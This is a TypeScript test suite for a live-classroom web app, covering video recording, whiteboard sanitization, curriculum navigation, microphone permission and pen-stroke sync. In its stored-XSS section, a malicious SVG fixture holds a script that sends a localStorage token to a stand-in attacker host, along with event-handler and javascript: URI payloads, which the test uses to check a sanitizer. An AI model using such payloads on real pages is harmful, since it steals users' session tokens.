import { describe, it, before, after } from 'node:test';
import assert from 'node:assert/strict';
import http from 'node:http';
import fs from 'node:fs';
import path from 'node:path';

import {
  RECORDER_CONFIG,
  PREFERRED_CODECS,
  getStrict720pMediaConstraints,
  selectSupportedMimeType,
  getRecorderOptions,
  computeRandomUploadJitterMs,
} from '../src/modules/live-classroom/hooks/useCompressedClassRecorder';

import {
  CurriculumClient,
  sanitizeWhiteboardPayloadForStorage,
  RelationalLessonContext,
} from '../src/modules/live-classroom/services/curriculumClient';

import * as ContentSyncMath from '../src/modules/live-classroom/utils/contentSyncMath';
import {
  requestBrowserMicrophonePermission,
  downsampleFloat32ToInt16,
  encodePcmInt16ToBase64,
  decodePcmToFloat32,
  VOICE_RELAY_SAMPLE_RATE,
} from '../src/modules/live-classroom/hooks/useLiveKitStage';

describe('Phase 2 Unit & Integration Suite — 720p Recorder, Jitter, Multi-Topic Navigation & Rough Pad Removal', () => {
  describe('1. 720p Browser Hardware Encoder & Random Jitter Unit Tests', () => {
    it('enforces strict 1280x720 resolution and 15-20fps frameRate constraints', () => {
      const constraints = getStrict720pMediaConstraints();
      const video = constraints.video as MediaTrackConstraints;

      assert.deepEqual(video.width, { ideal: 1280, max: 1280 });
      assert.deepEqual(video.height, { ideal: 720, max: 720 });
      assert.deepEqual(video.frameRate, { ideal: 15, max: 20 });
    });

    it('cascades codec selection: vp9,opus -> avc1,mp4a -> vp8,opus -> video/webm', () => {
      // 1. Supports VP9 + Opus
      const mimeVp9 = selectSupportedMimeType((m) => m === 'video/webm;codecs=vp9,opus');
      assert.equal(mimeVp9, 'video/webm;codecs=vp9,opus');

      // 2. Fallback to H.264 + AAC (Safari / iOS)
      const mimeMp4 = selectSupportedMimeType((m) => m === 'video/mp4;codecs=avc1,mp4a');
      assert.equal(mimeMp4, 'video/mp4;codecs=avc1,mp4a');

      // 3. Fallback to VP8 + Opus
      const mimeVp8 = selectSupportedMimeType((m) => m === 'video/webm;codecs=vp8,opus');
      assert.equal(mimeVp8, 'video/webm;codecs=vp8,opus');

      // 4. Fallback to generic video/webm
      const mimeDefault = selectSupportedMimeType(() => false);
      assert.equal(mimeDefault, 'video/webm');
    });

    it('enforces 500 kbps video VBR and 48 kbps Opus audio bitrate caps', () => {
      const options = getRecorderOptions((m) => m === PREFERRED_CODECS[0]);
      assert.equal(options.mimeType, 'video/webm;codecs=vp9,opus');
      assert.equal(options.videoBitsPerSecond, 500_000);
      assert.equal(options.audioBitsPerSecond, 48_000);
      assert.equal(RECORDER_CONFIG.CHUNK_INTERVAL_MS, 10_000);
    });

    it('generates random chunk upload jitter strictly within [150ms, 1850ms] across 1,000 samples', () => {
      let minSeen = Infinity;
      let maxSeen = -Infinity;

      for (let i = 0; i < 1000; i++) {
        const jitter = computeRandomUploadJitterMs();
        assert.ok(
          jitter >= 150 && jitter <= 1850,
          `Jitter ${jitter}ms out of bounds [150, 1850]`
        );
        if (jitter < minSeen) minSeen = jitter;
        if (jitter > maxSeen) maxSeen = jitter;
      }

      // Deterministic boundary check
      assert.equal(computeRandomUploadJitterMs(150, 1850, () => 0), 150);
      assert.equal(computeRandomUploadJitterMs(150, 1850, () => 0.999999), 1850);
      assert.ok(maxSeen - minSeen > 1000, 'Jitter distribution spans wide range to prevent server spikes');
    });
  });

  describe('2. Strictly Two Stored Artifacts — Whiteboard Sanitization Unit Tests', () => {
    it('strips Content Mode pen/laser strokes and deleted Excalidraw elements before storage', () => {
      const dirtyPayload = {
        elements: [
          { id: 'el_rect_1', type: 'rectangle', x: 100, y: 120, isDeleted: false },
          { id: 'el_deleted_2', type: 'ellipse', x: 50, y: 50, isDeleted: true },
          { id: 'el_content_stroke', type: 'content_stroke', x: 10, y: 10 },
          { id: 'el_laser', type: 'laser_pointer', x: 20, y: 20 },
          { id: 'el_text_3', type: 'text', text: 'V = I * R', x: 200, y: 240 },
        ],
        appState: {
          viewBackgroundColor: '#ffffff',
          gridSize: 20,
          collaborators: new Map(),
        },
        files: { file_1: { id: 'file_1', mimeType: 'image/png' } },
        penStrokes: [{ id: 'stroke_1', points: [[1, 2]] }],
        contentStrokes: [{ id: 'stroke_2' }],
        laserPointer: { x: 100, y: 200, active: true },
      };

      const sanitized = sanitizeWhiteboardPayloadForStorage(dirtyPayload);

      assert.equal(sanitized.elements.length, 2);
      assert.deepEqual(
        sanitized.elements.map((e: any) => e.id),
        ['el_rect_1', 'el_text_3']
      );
      assert.equal((sanitized as any).penStrokes, undefined);
      assert.equal((sanitized as any).contentStrokes, undefined);
      assert.equal((sanitized as any).laserPointer, undefined);
      assert.equal(sanitized.appState.viewBackgroundColor, '#ffffff');
    });
  });

  describe('3. Student Rough Pad Removal & Light-Theme Multi-Topic UI Verification', () => {
    it('verifies Student Rough Pad tab & branch are removed from TopModeNavbar and LearningSessionLayout', () => {
      const navbarSource = fs.readFileSync(
        path.resolve(__dirname, '../src/modules/live-classroom/components/TopModeNavbar.tsx'),
        'utf8'
      );
      const layoutSource = fs.readFileSync(
        path.resolve(__dirname, '../src/modules/live-classroom/LearningSessionLayout.tsx'),
        'utf8'
      );

      // Rough Pad button & state branch must not exist
      assert.equal(navbarSource.includes('data-testid="mode-btn-roughpad"'), false);
      assert.equal(layoutSource.includes('key="student-rough-pad"'), false);
      assert.equal(layoutSource.includes("studentTab === 'roughpad'"), false);

      // New Phase 2 controls must be present
      assert.equal(navbarSource.includes('data-testid="teaching-mode-toggle-btn"'), true);
      assert.equal(navbarSource.includes('data-testid="recorder-status-pill"'), true);
    });
  });

  describe('4. End-to-End Frontend CurriculumClient <-> Mock Broadcast API Integration Test', () => {
    let mockServer: http.Server;
    let baseUrl: string;
    const receivedRequests: Array<{ method: string; url: string; headers: any; body: any }> = [];

    before(async () => {
      mockServer = http.createServer((req, res) => {
        const chunks: Buffer[] = [];
        req.on('data', (c) => chunks.push(c));
        req.on('end', () => {
          const rawBody = Buffer.concat(chunks);
          const contentType = req.headers['content-type'] || '';
          const parsedBody = contentType.includes('application/json')
            ? JSON.parse(rawBody.toString('utf8') || '{}')
            : rawBody;

          receivedRequests.push({
            method: req.method || 'GET',
            url: req.url || '/',
            headers: req.headers,
            body: parsedBody,
          });

          res.setHeader('Content-Type', 'application/json');

          if (req.url?.includes('/video-chunk')) {
            res.writeHead(200);
            res.end(
              JSON.stringify({
                success: true,
                data: {
                  chunkIndex: Number(req.headers['x-chunk-index'] ?? 0),
                  bytesAppended: rawBody.length,
                },
              })
            );
            return;
          }

          if (req.url?.includes('/curriculum-navigate')) {
            res.writeHead(200);
            res.end(
              JSON.stringify({
                success: true,
                message: 'Segment logged',
                data: {
                  activeSegment: {
                    segmentIndex: receivedRequests.filter((r) =>
                      r.url.includes('/curriculum-navigate')
                    ).length,
                    chapterId: parsedBody.chapterId,
                    lessonId: parsedBody.lessonId,
                    topicId: parsedBody.topicId ?? null,
                    mode: parsedBody.mode,
                    startOffsetSec: parsedBody.videoOffsetSec,
                    endOffsetSec: null,
                    startedAtIso: new Date().toISOString(),
                    endedAtIso: null,
                  },
                  totalSegments: 2,
                  videoStorageKey:
                    'courses/course_12/board_2_lang_1/ch_10/lesson_101/v1_2026/video_720p.webm',
                },
              })
            );
            return;
          }

          if (req.url?.includes('/whiteboard-save')) {
            res.writeHead(200);
            res.end(
              JSON.stringify({
                success: true,
                message: 'Whiteboard saved',
                data: {
                  sessionId: 'sess_phase2_e2e',
                  lessonId: parsedBody.lessonId,
                  whiteboardStorageKey: `courses/course_12/board_2_lang_1/ch_${parsedBody.chapterId}/lesson_${parsedBody.lessonId}/v1_2026/whiteboard.json`,
                  compressedBytes: 256,
                  uncompressedBytes: 512,
                  elementsCount: parsedBody.elements?.length || 0,
                },
              })
            );
            return;
          }

          if (req.url?.includes('/finalize')) {
            res.writeHead(200);
            res.end(
              JSON.stringify({
                success: true,
                message: 'Session finalized',
                data: {
                  sessionId: 'sess_phase2_e2e',
                  totalDurationSec: parsedBody.totalDurationSec,
                },
              })
            );
            return;
          }

          res.writeHead(404);
          res.end(JSON.stringify({ message: 'Not found' }));
        });
      });

      await new Promise<void>((resolve) => {
        mockServer.listen(0, '127.0.0.1', () => {
          const addr = mockServer.address() as { port: number };
          baseUrl = `http://127.0.0.1:${addr.port}`;
          process.env.NEXT_PUBLIC_BROADCAST_API_URL = baseUrl;
          resolve();
        });
      });
    });

    after(async () => {
      await new Promise<void>((resolve) => mockServer.close(() => resolve()));
    });

    it('streams 720p chunks, navigates taught + reference_only lessons, saves sanitized whiteboard, and finalizes session', async () => {
      const sessionId = 'sess_phase2_e2e';
      const relContext: RelationalLessonContext = {
        sessionId,
        contextType: 'course_lesson',
        branchId: 4,
        batchId: 105,
        boardId: 2,
        languageId: 1,
        courseId: 12,
        linkedVodCourseId: 212,
        subjectId: 1,
        chapterId: 10,
        chapterNumber: 1,
        chapterTitle: 'Electrostatics',
        lessonId: 101,
        lessonNumber: '1.1',
        lessonTitle: 'Coulomb Law',
        topicId: 1001,
        teacherId: 501,
        academicYear: 2026,
        version: 1,
        publishToVodCourse: true,
        isPrimaryVod: true,
      };

      // 1. Upload Chunk #0 and Chunk #1
      const chunk0 = new Uint8Array([0x1a, 0x45, 0xdf, 0xa3, 0x11, 0x22]);
      const res0 = await CurriculumClient.uploadVideoChunk(sessionId, chunk0, {
        chunkIndex: 0,
        mimeType: 'video/webm;codecs=vp9,opus',
        relationalContext: relContext,
      });
      assert.equal(res0.success, true);
      assert.equal(res0.data.chunkIndex, 0);

      // 2. Teacher opens Lesson 99 in 'reference_only' mode at 300s (protects old VOD & WB)
      const navRefRes = await CurriculumClient.navigateCurriculum(sessionId, {
        chapterId: 9,
        lessonId: 99,
        topicId: 901,
        videoOffsetSec: 300,
        mode: 'reference_only',
        relationalContext: { ...relContext, lessonId: 99, publishToVodCourse: false },
      });
      assert.equal(navRefRes.success, true);
      assert.equal(navRefRes.data.activeSegment.mode, 'reference_only');
      assert.equal(navRefRes.data.activeSegment.startOffsetSec, 300);

      // 3. Teacher switches to Lesson 102 in 'taught' mode at 450s
      const navTaughtRes = await CurriculumClient.navigateCurriculum(sessionId, {
        chapterId: 10,
        lessonId: 102,
        topicId: 1002,
        videoOffsetSec: 450,
        mode: 'taught',
        relationalContext: { ...relContext, lessonId: 102, publishToVodCourse: true },
      });
      assert.equal(navTaughtRes.success, true);
      assert.equal(navTaughtRes.data.activeSegment.mode, 'taught');

      // 4. Save Whiteboard for taught lesson (verifying content_stroke is stripped)
      const wbRes = await CurriculumClient.saveWhiteboard(sessionId, {
        chapterId: 10,
        lessonId: 102,
        topicId: 1002,
        elements: [
          { id: 'wb_1', type: 'rectangle', x: 10, y: 20 },
          { id: 'bad_stroke', type: 'content_stroke', x: 0, y: 0 },
        ],
        relationalContext: relContext,
      });
      assert.equal(wbRes.success, true);
      assert.equal(wbRes.data.elementsCount, 1);

      // 5. Finalize Session on End Class
      const finRes = await CurriculumClient.finalizeSession(sessionId, {
        totalDurationSec: 900,
        relationalContext: relContext,
        whiteboard: {
          elements: [{ id: 'wb_final', type: 'arrow', x: 50, y: 60 }],
        },
      });
      assert.equal(finRes.success, true);
      assert.equal(finRes.data.totalDurationSec, 900);
    });
  });

  describe('5. P2-1: Stored XSS Sanitization for svgDiagram Before dangerouslySetInnerHTML', () => {
    it('strips <script>, <foreignObject>, inline on* event handlers, and javascript: URIs from svgDiagram while preserving valid SVG elements', () => {
      const sanitizeSvgMarkup = (ContentSyncMath as any).sanitizeSvgMarkup;
      assert.equal(
        typeof sanitizeSvgMarkup,
        'function',
        'sanitizeSvgMarkup must be exported from contentSyncMath.ts'
      );

      const maliciousSvg = `
        <svg viewBox="0 0 200 100" onload="alert('xss')" xmlns="http://www.w3.org/2000/svg">
          <script>fetch('https://attacker.tld/steal?t=' + localStorage.getItem('token'))</script>
          <foreignObject width="100" height="50">
            <iframe src="javascript:alert(1)"></iframe>
          </foreignObject>
          <a href="javascript:alert(2)" xlink:href="javascript:alert(3)">
            <circle cx="50" cy="50" r="40" stroke="#2563eb" fill="none" onerror="alert(4)" onclick="evil()" />
          </a>
          <path d="M 10 10 L 90 90" stroke="#1e293b" stroke-width="2" />
        </svg>
      `;

      const cleanSvg = sanitizeSvgMarkup(maliciousSvg);
      assert.equal(/<script/i.test(cleanSvg), false, '<script> tags must be stripped');
      assert.equal(/<foreignObject/i.test(cleanSvg), false, '<foreignObject> tags must be stripped');
      assert.equal(/\bon\w+\s*=/i.test(cleanSvg), false, 'Inline on* event handlers must be stripped');
      assert.equal(/javascript\s*:/i.test(cleanSvg), false, 'javascript: URIs must be neutralized');
      assert.equal(cleanSvg.includes('<circle'), true, 'Valid <circle> SVG element must be preserved');
      assert.equal(cleanSvg.includes('<path'), true, 'Valid <path> SVG element must be preserved');

      const stageSource = fs.readFileSync(
        path.resolve(__dirname, '../src/modules/live-classroom/components/VirtualContentStage.tsx'),
        'utf8'
      );
      assert.equal(
        stageSource.includes('sanitizeSvgMarkup(block.svgDiagram)'),
        true,
        'VirtualContentStage.tsx must wrap block.svgDiagram with sanitizeSvgMarkup() before dangerouslySetInnerHTML'
      );
    });
  });

  describe('6. P2-4: Classroom JWT Stored in sessionStorage Instead of /rejoin URL Query String', () => {
    it('stores classroom JWT in sessionStorage(broadcast_rejoin_token) instead of leaking ?token= in /rejoin URLs', () => {
      const layoutSource = fs.readFileSync(
        path.resolve(__dirname, '../src/modules/live-classroom/LearningSessionLayout.tsx'),
        'utf8'
      );
      const rejoinSource = fs.readFileSync(
        path.resolve(__dirname, '../src/modules/live-classroom/components/RejoinScreen.tsx'),
        'utf8'
      );

      assert.equal(
        layoutSource.includes("sessionStorage.setItem('broadcast_rejoin_token'"),
        true,
        'LearningSessionLayout.tsx must persist token in sessionStorage before redirecting to /rejoin'
      );
      assert.equal(
        layoutSource.includes('...(token ? { token } : {})'),
        false,
        'LearningSessionLayout.tsx must not append raw token to /rejoin URL query parameters'
      );
      assert.equal(
        rejoinSource.includes("sessionStorage.getItem('broadcast_rejoin_token')"),
        true,
        'RejoinScreen.tsx must read broadcast_rejoin_token from sessionStorage'
      );
      assert.equal(
        rejoinSource.includes('...(token ? { token } : {})'),
        false,
        'RejoinScreen.tsx must not append raw token to / URL query parameters on rejoin'
      );
    });
  });

  describe('7. Goal Deliverables: Comic Sans Default Font, No Student Clear Button, Screen Wake Lock & Cross-Browser Support', () => {
    it('enforces Comic Sans (fontFamily: 5) as default whiteboard font and hides Clear button from students', () => {
      const stageSource = fs.readFileSync(
        path.resolve(__dirname, '../src/modules/live-classroom/components/ExcalidrawStage.tsx'),
        'utf8'
      );
      const globalsCss = fs.readFileSync(
        path.resolve(__dirname, '../src/app/globals.css'),
        'utf8'
      );

      // 1. Default whiteboard font is 5 (Comic Sans / ComicShanns)
      assert.equal(
        stageSource.includes('export const DEFAULT_WHITEBOARD_FONT_FAMILY = 5'),
        true,
        'ExcalidrawStage.tsx must export DEFAULT_WHITEBOARD_FONT_FAMILY = 5 (Comic Sans)'
      );
      assert.equal(
        stageSource.includes('currentItemFontFamily: DEFAULT_WHITEBOARD_FONT_FAMILY'),
        true,
        'ExcalidrawStage initialData and scene updates must use DEFAULT_WHITEBOARD_FONT_FAMILY'
      );
      assert.equal(
        globalsCss.includes('Comic Sans MS'),
        true,
        'globals.css must include Comic Sans MS font stack for whiteboard rendering'
      );

      // 2. Clear button is restricted strictly to teacher (never shown to student on live classroom whiteboard)
      assert.equal(
        stageSource.includes("const canClearWhiteboard = isEditable && (role === 'teacher' || isRoughPad)"),
        true,
        'ExcalidrawStage.tsx must restrict Clear button to canClearWhiteboard (never shown to students on live whiteboard)'
      );
    });

    it('provides useScreenWakeLock hook and integrates it into LearningSessionLayout to prevent phone screen auto-off', () => {
      const wakeLockPath = path.resolve(
        __dirname,
        '../src/modules/live-classroom/hooks/useScreenWakeLock.ts'
      );
      assert.equal(
        fs.existsSync(wakeLockPath),
        true,
        'useScreenWakeLock.ts hook must exist'
      );

      const wakeLockSource = fs.readFileSync(wakeLockPath, 'utf8');
      assert.equal(
        wakeLockSource.includes("wakeLock.request('screen')"),
        true,
        'useScreenWakeLock must request W3C Screen Wake Lock API'
      );
      assert.equal(
        wakeLockSource.includes('visibilitychange'),
        true,
        'useScreenWakeLock must re-acquire wake lock on visibilitychange'
      );

      const layoutSource = fs.readFileSync(
        path.resolve(__dirname, '../src/modules/live-classroom/LearningSessionLayout.tsx'),
        'utf8'
      );
      assert.equal(
        layoutSource.includes('useScreenWakeLock('),
        true,
        'LearningSessionLayout.tsx must activate useScreenWakeLock during live sessions'
      );
    });

    it('supports Chrome, Safari, Firefox, and Edge across MediaRecorder codecs, Fullscreen APIs, and Multi-Device Controls', () => {
      // 1. Safari generic video/mp4 fallback in PREFERRED_CODECS
      assert.equal(
        PREFERRED_CODECS.includes('video/mp4'),
        true,
        'PREFERRED_CODECS must include generic video/mp4 for Safari compatibility'
      );

      // 2. Fullscreen hook supports webkit, moz, and ms vendor prefixes
      const fsSource = fs.readFileSync(
        path.resolve(__dirname, '../src/modules/live-classroom/hooks/useFullscreenWorkspace.ts'),
        'utf8'
      );
      assert.equal(
        fsSource.includes('mozRequestFullScreen') && fsSource.includes('webkitRequestFullscreen'),
        true,
        'useFullscreenWorkspace.ts must support Safari webkit and Firefox moz prefixes'
      );

      // 3. TopModeNavbar includes Host Teacher per-student multi-device toggle
      const navbarSource = fs.readFileSync(
        path.resolve(__dirname, '../src/modules/live-classroom/components/TopModeNavbar.tsx'),
        'utf8'
      );
      assert.equal(
        navbarSource.includes('multi-device-btn-'),
        true,
        'TopModeNavbar.tsx must render per-student multi-device toggle for the Host Teacher'
      );
    });

    it('synchronizes Whiteboard and Content scroll, camera, laser, and cursor bidirectionally across Host, Co-Host, and Students with board access', () => {
      const wbStageSource = fs.readFileSync(
        path.resolve(__dirname, '../src/modules/live-classroom/components/ExcalidrawStage.tsx'),
        'utf8'
      );
      const contentStageSource = fs.readFileSync(
        path.resolve(__dirname, '../src/modules/live-classroom/components/VirtualContentStage.tsx'),
        'utf8'
      );

      // 1. ExcalidrawStage syncs incoming remote camera for all roles (not gated by role === 'student') and prevents self-echo via authorId + suppressRemoteCameraEchoUntilRef
      assert.equal(
        wbStageSource.includes('currentUserId && camera.authorId && camera.authorId === currentUserId') &&
          wbStageSource.includes('if (isEditable && isOwnCamera) return;'),
        true,
        'ExcalidrawStage must ignore self-authored camera updates while syncing remote camera updates to Host, Co-Host, and Students'
      );
      assert.equal(
        wbStageSource.includes('suppressRemoteCameraEchoUntilRef'),
        true,
        'ExcalidrawStage must suppress programmatic camera echoes when applying remote camera updates'
      );
      assert.equal(
        wbStageSource.includes('if (!effectiveIsHostTeacher || !isEditable || isRoughPad || !apiReady) return;'),
        true,
        'ExcalidrawStage must only broadcast initial camera on mount from the Host Teacher so joining Co-Hosts do not reset camera to (0,0)'
      );

      // 2. VirtualContentStage syncs incoming scroll and laser for all roles (Host, Co-Host, Student) and prevents programmatic scroll echo
      assert.equal(
        contentStageSource.includes('contentState.scrollAnchor.authorId === currentUserId') &&
          contentStageSource.includes('if (!followTeacher || (canAnnotate && isOwnScroll)) return;'),
        true,
        'VirtualContentStage must ignore self-authored scroll anchors while syncing remote scroll updates to Host, Co-Host, and Students'
      );
      assert.equal(
        contentStageSource.includes('if (isProgrammaticScrollRef.current) return;'),
        true,
        'VirtualContentStage handleScroll must not echo programmatic scroll updates back over the socket'
      );
      assert.equal(
        contentStageSource.includes('const isRemoteLaser =') &&
          contentStageSource.includes('laserPointer.authorId !== currentUserId'),
        true,
        'VirtualContentStage must render remote laser pointer and live cursor for all participants (Host, Co-Host, and Students)'
      );
    });
  });

  describe('8. Real-Time Microphone Permission Check & Hybrid LiveKit + Port-443 Voice Relay', () => {
    it('requests real-time browser microphone permission and stops temporary stream tracks when granted', async () => {
      let stoppedCount = 0;
      const originalNavigator = (globalThis as any).navigator;
      try {
        Object.defineProperty(globalThis, 'navigator', {
          configurable: true,
          writable: true,
          value: {
            mediaDevices: {
              getUserMedia: async () => ({
                getTracks: () => [
                  {
                    stop: () => {
                      stoppedCount += 1;
                    },
                  },
                ],
              }),
            },
          },
        });

        const res = await requestBrowserMicrophonePermission();
        assert.equal(res.granted, true);
        assert.equal(res.errorCode, undefined);
        assert.equal(stoppedCount, 1, 'Temporary permission check tracks must be stopped immediately');
      } finally {
        Object.defineProperty(globalThis, 'navigator', {
          configurable: true,
          writable: true,
          value: originalNavigator,
        });
      }
    });

    it('returns actionable PERMISSION_DENIED and NO_DEVICE errors when browser microphone access fails', async () => {
      const originalNavigator = (globalThis as any).navigator;
      try {
        Object.defineProperty(globalThis, 'navigator', {
          configurable: true,
          writable: true,
          value: {
            mediaDevices: {
              getUserMedia: async () => {
                const err = new Error('Permission denied by user');
                err.name = 'NotAllowedError';
                throw err;
              },
            },
          },
        });

        const deniedRes = await requestBrowserMicrophonePermission();
        assert.equal(deniedRes.granted, false);
        assert.equal(deniedRes.errorCode, 'PERMISSION_DENIED');
        assert.ok(deniedRes.error?.includes('Microphone permission'));

        Object.defineProperty(globalThis, 'navigator', {
          configurable: true,
          writable: true,
          value: {
            mediaDevices: {
              getUserMedia: async () => {
                const err = new Error('Requested device not found');
                err.name = 'NotFoundError';
                throw err;
              },
            },
          },
        });

        const noDeviceRes = await requestBrowserMicrophonePermission();
        assert.equal(noDeviceRes.granted, false);
        assert.equal(noDeviceRes.errorCode, 'NO_DEVICE');
      } finally {
        Object.defineProperty(globalThis, 'navigator', {
          configurable: true,
          writable: true,
          value: originalNavigator,
        });
      }
    });

    it('accurately downsamples, encodes, and decodes 16kHz PCM voice frames for the Port-443 voice relay', () => {
      assert.equal(VOICE_RELAY_SAMPLE_RATE, 16000);
      const input48k = new Float32Array(480);
      for (let i = 0; i < input48k.length; i++) {
        input48k[i] = Math.sin((2 * Math.PI * i) / 48) * 0.5;
      }

      const { pcmInt16, rms } = downsampleFloat32ToInt16(input48k, 48000, VOICE_RELAY_SAMPLE_RATE);
      assert.equal(pcmInt16.length, 160);
      assert.ok(rms > 0.2 && rms < 0.5, 'RMS level must be computed accurately');

      const b64 = encodePcmInt16ToBase64(pcmInt16);
      assert.ok(typeof b64 === 'string' && b64.length > 0);

      const decoded = decodePcmToFloat32(b64);
      assert.ok(decoded, 'Decoded Float32Array must not be null');
      assert.equal(decoded!.length, 160);
      assert.ok(Math.abs(decoded![12] - input48k[36]) < 0.01, 'Decoded PCM sample must match input waveform');
    });

    it('enforces real-time mic permission before Student raiseHand (so Host/Co-Host only see permitted students) and before Host/Co-Host/Student unmute', () => {
      const layoutSource = fs.readFileSync(
        path.resolve(__dirname, '../src/modules/live-classroom/LearningSessionLayout.tsx'),
        'utf8'
      );

      assert.equal(
        layoutSource.includes('const handleStudentRaiseHand = useCallback(async () => {') &&
          layoutSource.includes('const perm = await ensureMicrophonePermission();') &&
          layoutSource.includes('if (!perm.granted) {\n      return;\n    }\n    raiseHand();'),
        true,
        'LearningSessionLayout must verify browser microphone permission in handleStudentRaiseHand before calling raiseHand()'
      );

      assert.equal(
        layoutSource.includes('data-testid="mic-permission-alert-banner"') &&
          layoutSource.includes('data-testid="audio-autoplay-unlock-banner"'),
        true,
        'LearningSessionLayout must render mic permission alert banner and audio autoplay unlock banner'
      );
    });
  });

  // =========================================================================
  // 9. Cross-Device Pen Marking Sync, Word Highlight Commented Out & Steady Scroll Sync
  // =========================================================================
  describe('9. Cross-Device Pen Marking Sync, Word Highlight Commented Out & Steady Scroll Sync', () => {
    it('binds underlines drawn below Line 1 and in inter-word spaces to Line 1 tokens instead of snapping to Line 2 tokens below', async () => {
      const { hitTestWordToken } = await import(
        '../src/modules/live-classroom/utils/contentSyncMath'
      );

      // Simulate a paragraph where Line 1 is at y=40..61 (height=21) and Line 2 is at y=68..89 (7px gap)
      const tokenList = [
        { tokenId: 'b1:text:0', left: 20, top: 40, width: 65, height: 21 },
        { tokenId: 'b1:text:1', left: 93, top: 40, width: 55, height: 21 },
        // Line 2 directly underneath the space between b1:text:0 and b1:text:1
        { tokenId: 'b1:text:10', left: 60, top: 68, width: 70, height: 21 },
      ];
      const cache = {
        blockId: 'b1',
        blockRect: { left: 0, top: 0, width: 760, height: 220 } as DOMRect,
        tokens: new Map(tokenList.map((t) => [t.tokenId, t])),
        tokenList,
        regions: new Map(),
      };

      // Drawing an underline 5px below Line 1 (py = 66) in the inter-word space (px = 88)
      // Previously, symmetric vertical distance made py=66 closer to Line 2 (68-66=2px) than Line 1 (66-61=5px).
      // With asymmetric line-aware vertical hit-testing, py=66 is inside Line 1's underline zone [41.5, 67] and above Line 2's top (68+1.5=69.5).
      const hit = hitTestWordToken(88, 66, cache);
      assert.ok(hit, 'Underline in inter-word space 5px below Line 1 must hit a token');
      assert.ok(
        hit!.token.tokenId === 'b1:text:0' || hit!.token.tokenId === 'b1:text:1',
        `Expected Line 1 token (b1:text:0 or b1:text:1), got ${hit!.token.tokenId}`
      );
    });

    it('projects Laptop Pen strokes onto exact wrapped Mobile words and breaks wrapped lines cleanly with M', async () => {
      const {
        projectPointToDevicePixels,
        buildResponsiveSvgPath,
      } = await import('../src/modules/live-classroom/utils/contentSyncMath');

      // Laptop layout (760px wide): 4 words on a single line (y=40, height=20)
      const laptopTokenList = [
        { tokenId: 'b1:text:0', left: 24, top: 40, width: 80, height: 20 },
        { tokenId: 'b1:text:1', left: 112, top: 40, width: 90, height: 20 },
        { tokenId: 'b1:text:2', left: 210, top: 40, width: 85, height: 20 },
        { tokenId: 'b1:text:3', left: 303, top: 40, width: 95, height: 20 },
      ];
      const laptopLayout = {
        blockId: 'b1',
        blockRect: { left: 0, top: 0, width: 760, height: 220 } as DOMRect,
        tokens: new Map(laptopTokenList.map((t) => [t.tokenId, t])),
        tokenList: laptopTokenList,
        regions: new Map(),
      };

      // Mobile layout (350px wide): b1:text:0 and b1:text:1 on Line 1 (y=36), b1:text:2 and b1:text:3 wrapped to Line 2 (y=64)
      const mobileTokenList = [
        { tokenId: 'b1:text:0', left: 16, top: 36, width: 74, height: 19 },
        { tokenId: 'b1:text:1', left: 98, top: 36, width: 82, height: 19 },
        { tokenId: 'b1:text:2', left: 16, top: 64, width: 78, height: 19 },
        { tokenId: 'b1:text:3', left: 102, top: 64, width: 88, height: 19 },
      ];
      const mobileLayout = {
        blockId: 'b1',
        blockRect: { left: 0, top: 0, width: 350, height: 410 } as DOMRect,
        tokens: new Map(mobileTokenList.map((t) => [t.tokenId, t])),
        tokenList: mobileTokenList,
        regions: new Map(),
      };

      // Pen stroke drawn across b1:text:0 -> b1:text:3 on Laptop at ry = 1.05 (just below text)
      const strokePoints = [
        { x: 3.5, y: 27.7, tokenId: 'b1:text:0', rx: 0.05, ry: 1.05 },
        { x: 18.0, y: 27.7, tokenId: 'b1:text:1', rx: 0.3, ry: 1.05 },
        { x: 31.0, y: 27.7, tokenId: 'b1:text:2', rx: 0.3, ry: 1.05 },
        { x: 51.0, y: 27.7, tokenId: 'b1:text:3', rx: 0.95, ry: 1.05 },
      ];

      // 1. Verify Pen stroke point projects to Mobile's wrapped token coordinates (NOT raw block percentage)
      const projectedW2OnMobile = projectPointToDevicePixels(strokePoints[2], mobileLayout, true);
      // b1:text:2 on mobile: left=16 + 0.3*78 = 39.4, top=64 + 1.05*19 = 83.95
      assert.ok(
        Math.abs(projectedW2OnMobile.px - 39.4) < 1 && Math.abs(projectedW2OnMobile.py - 83.95) < 1,
        `Pen stroke must anchor to Mobile token b1:text:2 (got px=${projectedW2OnMobile.px}, py=${projectedW2OnMobile.py})`
      );

      // 2. Verify buildResponsiveSvgPath on Laptop stays a single continuous subpath (1 'M')
      const laptopPath = buildResponsiveSvgPath(strokePoints, laptopLayout, true);
      const laptopMoveCount = (laptopPath.match(/M /g) || []).length;
      assert.equal(laptopMoveCount, 1, `Laptop single-line stroke should have 1 M command, got: ${laptopPath}`);

      // 3. Verify buildResponsiveSvgPath on Mobile breaks into 2 horizontal subpaths across the wrapped line (2 'M' commands)
      const mobilePath = buildResponsiveSvgPath(strokePoints, mobileLayout, true);
      const mobileMoveCount = (mobilePath.match(/M /g) || []).length;
      assert.equal(
        mobileMoveCount,
        2,
        `Mobile wrapped-line stroke must split cleanly into 2 M subpaths without diagonal slash, got: ${mobilePath}`
      );
    });

    it('comments out automatic word highlighting with underline and keeps steady scroll sync without jumping visible sections to top', () => {
      const stageSource = fs.readFileSync(
        path.resolve(__dirname, '../src/modules/live-classroom/components/VirtualContentStage.tsx'),
        'utf8'
      );

      // Verify word highlighting with underline is commented out in renderTokenizedText
      assert.equal(
        stageSource.includes('Word highlighting with underline commented out as of now — using Pen SVG marking only'),
        true,
        'VirtualContentStage must have automatic word highlighting/underline commented out as requested'
      );

      // Verify pointer/pen auto-scroll does NOT jump a section to the top when already visible
      assert.equal(
        stageSource.includes('if (pointYInViewport >= edgeMargin && pointYInViewport <= viewportHeight - edgeMargin) {'),
        true,
        'VirtualContentStage must not scroll or jump a section to top when the marked/laser point is already visible in the viewport'
      );
    });
  });
});
